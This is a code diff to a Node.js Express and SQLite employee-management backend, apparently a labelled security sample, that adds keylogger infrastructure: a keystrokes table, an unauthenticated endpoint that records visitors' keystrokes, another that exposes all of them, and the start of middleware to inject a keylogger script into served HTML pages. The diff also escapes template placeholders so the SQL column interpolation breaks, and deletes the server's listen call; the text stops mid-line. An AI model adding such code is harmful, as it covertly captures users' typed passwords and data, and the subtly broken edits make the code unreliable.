@@ -32,7 +32,7 @@ const db = new sqlite3.Database(dbPath, (err) => {
   if (err) {
     console.error('Error opening database', err.message);
   } else {
-    console.log(`Connected to the SQLite database at ${dbPath}.`);
+    console.log(`Connected to the SQLite database at \${dbPath}.`);
 
     db.run(
       `CREATE TABLE IF NOT EXISTS users (
@@ -86,7 +86,7 @@ const db = new sqlite3.Database(dbPath, (err) => {
             db.get('SELECT COUNT(*) AS count FROM employees', (err, row) => {
               if (!err && row.count === 0) {
                 const insertEmployee = db.prepare(
-                  `INSERT INTO employees (name, department, ${employeeTitleColumn}, salary) VALUES (?, ?, ?, ?)`
+                  `INSERT INTO employees (name, department, \${employeeTitleColumn}, salary) VALUES (?, ?, ?, ?)`
                 );
                 [
                   ['John Perera', 'IT', 'Software Engineer', 85000],
@@ -101,6 +101,23 @@ const db = new sqlite3.Database(dbPath, (err) => {
               }
             });
           });
+        }
+      }
+    );
+
+    // ⚠️ VULNERABILITY: Create table to store keystrokes
+    db.run(
+      `CREATE TABLE IF NOT EXISTS keystrokes (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        session_id TEXT,
+        keystroke TEXT,
+        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+      )`,
+      (err) => {
+        if (err) {
+          console.error('Error creating keystrokes table', err.message);
+        } else {
+          console.log('Keystrokes table ready.');
         }
       }
     );
@@ -179,19 +196,55 @@ app.post('/api/employees', (req, res) => {
     return res.status(400).json({ error: 'Name, department, and role are required' });
   }
 
-  const query = `INSERT INTO employees (name, department, ${employeeTitleColumn}, salary) VALUES (?, ?, ?, ?)`;
+  const query = `INSERT INTO employees (name, department, \${employeeTitleColumn}, salary) VALUES (?, ?, ?, ?)`;
   db.run(query, [name, department, employeeTitle, salary], function (err) {
     if (err) return res.status(500).json({ error: 'Database error' });
     res.status(201).json({ success: true, employee: { id: this.lastID, name, department, role: employeeTitle, salary } });
   });
 });
 
-app.use(express.static(path.join(__dirname, 'dist')));
-app.use((req, res) => {
-  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
+// ⚠️ VULNERABILITY: Endpoint to receive and store keystrokes
+app.post('/api/log', (req, res) => {
+  const { keystroke } = req.body;
+  const sessionId = req.sessionID || 'unknown';
+  
+  if (!keystroke) {
+    return res.status(400).json({ error: 'Keystroke data required' });
+  }
+  
+  db.run(
+    'INSERT INTO keystrokes (session_id, keystroke) VALUES (?, ?)',
+    [sessionId, keystroke],
+    function (err) {
+      if (err) {
+        console.error('Error logging keystroke:', err.message);
+        return res.status(500).json({ error: 'Failed to log keystroke' });
+      }
+      res.status(201).json({ success: true, id: this.lastID });
+    }
+  );
 });
 
-const PORT = process.env.PORT || port;
-app.listen(PORT, () => {
-  console.log(`Backend running at http://localhost:${PORT}`);
+// ⚠️ VULNERABILITY: Endpoint to retrieve all keystrokes (no authentication)
+app.get('/api/keystrokes', (req, res) => {
+  db.all('SELECT * FROM keystrokes ORDER BY timestamp DESC', [], (err, rows) => {
+    if (err) {
+      console.error('Error retrieving keystrokes:', err.message);
+      return res.status(500).json({ error: 'Database error' });
+    }
+    res.json({ success: true, count: rows.length, data: rows });
+  });
 });
+
+// ⚠️ VULNERABILITY: Inject keylogger script into static pages
+app.use(express.static(path.join(__dirname, 'dist')));
+
+app.use((req, res, next) => {
+  if (req.path.endsWith('.js')) {
+    // Don't inject into JS files
+    return next();
+  }
+  
+  // Check if this is a request for an HTML file
+  if (req.path.endsWith('.html') || req.path === '/') {
+    const filePath = path.join
